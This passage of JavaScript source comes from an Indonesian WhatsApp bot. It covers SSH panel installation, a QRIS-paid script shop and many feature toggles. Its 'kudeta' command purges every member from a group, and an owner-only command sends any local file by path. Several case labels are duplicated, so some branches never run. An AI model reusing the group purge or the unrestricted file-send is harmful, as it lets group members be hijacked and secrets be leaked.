stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  



case "buyscript": case "buysc": {
if (m.isGroup) return reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝙎𝙞𝙢𝙥𝙡𝙚 𝘽𝙤𝙩 𝙑𝟏𝟏', 
                  description: "Rp50.000", 
                  id: '.buysc 1'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Script`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Script 𝙎𝙞𝙢𝙥𝙡𝙚 𝘽𝙤𝙩 𝙑𝟏𝟏"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V7"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Script`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break


case "kudetagc2": case "kudeta2": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
const anuan = "\nApakah Kamu Yakin Ingin Kudeta Grup Ini ?\n\nKlik Tombol *Yes* Untuk Melanjutkan\nKlik Tombol *No* Untuk Membatalkan"
global.statusKudeta = true
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: anuan
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"title\":\"Yes\",\"id\":\".kudetagc_respon yes\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"title\":\"No\",\"id\":\".kudetagc_respon no\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case "kudetagc_respon": {
if (!isCreator) return
if (global.statusKudeta == undefined) return
delete global.statusKudeta
if (text == "yes") {
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return reply("Grup Ini Sudah Tidak Ada Member!")
await reply("Kudeta Grup By Danny S8X Starting 🔥")
for (let i of memberFilter) {
await client.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
} else {
return reply("Kudeta Grup Berhasil Dibatalkan")
}
}
break





case "antilink": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return reply("Berhasil mematikan *antilink* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return reply("Berhasil mematikan *antilink2* di grup ini")
} else return reply(example("on/off"))
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return reply("Berhasil mematikan *mute* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return reply(example("on/off"))
}
break
  


case "getfile": {
if (!isCreator) return reply(mess.owner)
    if (!text) return reply("Silakan masukkan nama file!");

    const sendFile = (file) => {
        try {
            const filePath = `./${file}`;
            if (!fs.existsSync(filePath)) return `File *${file}* tidak ditemukan.`;

            return filePath; // Mengembalikan path file jika ditemukan
        } catch (err) {
            return `Terjadi kesalahan: ${err.message}`;
        }
    };

    try {
        const filePath = sendFile(text);
        if (filePath.startsWith("File") || filePath.startsWith("Terjadi")) {
            return reply(filePath); // Pesan kesalahan jika file tidak ditemukan
        }

        // Kirim file sebagai lampiran
        client.sendMessage(
            m.chat,
            { document: { url: filePath }, mimetype: "application/octet-stream", fileName: text },
            { quoted: loli }
        );
    } catch (e) {
        return reply(`Terjadi kesalahan: ${e.message}`);
    }
}
break;

case "antitoxic": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Toxic :* ${db.settings.antitoxic ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Toxic",
rows: [
{ title: "Aktifkan Anti Toxic", id: ".antitoxic on" }, 
{ title: "Matikan Anti Toxic", id: ".antitoxic off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antitoxic == true) return reply("*Anti toxic* sudah aktif")
global.db.settings.antitoxic = true
await reply("*Anti toxic* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antitoxic == false) return reply("*Anti toxic* sudah tidak aktif")
global.db.settings.antitoxic = false
await reply("*Anti toxic* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

case "antilinkall": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Link all :* ${db.settings.antilinkall ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Link all",
rows: [
{ title: "Aktifkan Anti Link all", id: ".antilinkall on" }, 
{ title: "Matikan Anti Link all", id: ".antilinkall off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antilinkall == true) return reply("*Anti Link all* sudah aktif")
global.db.settings.antilinkall = true
await reply("*Anti Link All* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antilinkall == false) return reply("*Anti Link All* sudah tidak aktif")
global.db.settings.antilinkall = false
await reply("*Anti Link All* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

case "antilinkwa": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Anti Badword :* ${db.settings.antilinkwa ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Anti Badword",
rows: [
{ title: "Aktifkan Anti Badword", id: ".antilinkwa on" }, 
{ title: "Matikan Anti Badword", id: ".antilinkwa off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.antilinkwa == true) return reply("*Anti Badword* sudah aktif")
global.db.settings.antilinkwa = true
await reply("*Anti Badword* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.antilinkwa == false) return reply("*Anti Badword* sudah tidak aktif")
global.db.settings.antilinkwa = false
await reply("*Anti Badword* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

case "autopromosi": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autopromosi == true) return reply("*Auto promosi* sudah aktif")
global.db.settings.autopromosi = true
await reply("*Auto promosi* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autopromosi == false) return reply("*Auto promosi* sudah tidak aktif")
global.db.settings.autopromosi = false
await reply("*Auto promosi* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "otomatisauto": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Ai",
rows: [
{ title: "Aktifkan Auto Ai", id: ".autoai on" }, 
{ title: "Matikan Auto Ai", id: ".autoai off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autoread == true) return reply("*Autoread* sudah aktif")
global.db.settings.autoread = true
await reply("*Autoread* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autoread == false) return reply("*Autoread* sudah tidak aktif")
global.db.settings.autoread = false
await reply("*Autoread* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "autotyping": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autotyping == true) return reply("*Auto typing* sudah aktif")
global.db.settings.autotyping = true
await reply("*Auto typing* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autotyping == false) return reply("*Auto typing* sudah tidak aktif")
global.db.settings.autotyping = false
await reply("*Auto typing* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "autoreadsw": {
if (!isCreator) return reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc()
if (q.toLowerCase() == "on") {
if (global.db.settings.readsw == true) return reply("*Autoread sw* sudah aktif")
global.db.settings.readsw = true
await reply("*Autoread sw* berhasil diaktifkan ✅")
await sendStatusGc()
} else if (q.toLowerCase() == "off") {
if (global.db.settings.readsw == false) return reply("*Autoread sw* sudah tidak aktif")
global.db.settings.readsw = false
await reply("*Autoread sw* berhasil dimatikan ✅")
await sendStatusGc()
} else {
return sendStatusGc()
}}
break


            case 'jodoh':
            case 'jodohku': {
           if (!m.isGroup) return reply(mess.group)
            let member = m.metadata.participants.map(v => v.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
client.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdreply": {
"showAdAttribution": true,
"containsAutoreply": true,
"title": ` ${global.botname2}`,
"body": `${global.namaowner}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
"sourceUrl": `${global.linkSaluran}`}}},
{ quoted: loli})        
            }
            break
            
            case "block": case "blok": {
if (!isCreator) return reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await client.updateBlockStatus(mem, "block")
if (m.isGroup) client.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: loli})
}
break

case "unblok": case "unblokir": {
if (!isCreator) return reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await client.updateBlockStatus(mem, "unblock");
if (m.isGroup) client.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: loli})
}
break

case "autoread": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return reply("Berhasil mematikan *autoread*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return reply("Berhasil mematikan *autopromosi*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return reply("Berhasil mematikan *autotyping*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return reply("Berhasil mematikan *autoreadsw*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return reply("Berhasil mematikan *welcome* di grup ini")
} else return reply(example("on/off"))
}
break

case "autoai": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].autoai == true) return reply(`*autoai* di grup ini sudah aktif!`)
global.db.groups[m.chat].autoai = true
return reply("Berhasil menyalakan *Auto-Ai* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].autoai == false) return reply(`*Auto-Ai* di grup ini tidak aktif!`)
global.db.groups[m.chat].autoai = false
return reply("Berhasil mematikan *Auto-Ai* di grup ini")
} else return reply(example("on/off"))
}
break

case "cekdns": {
if (!isCreator) return reply(mess.owner)
    try {
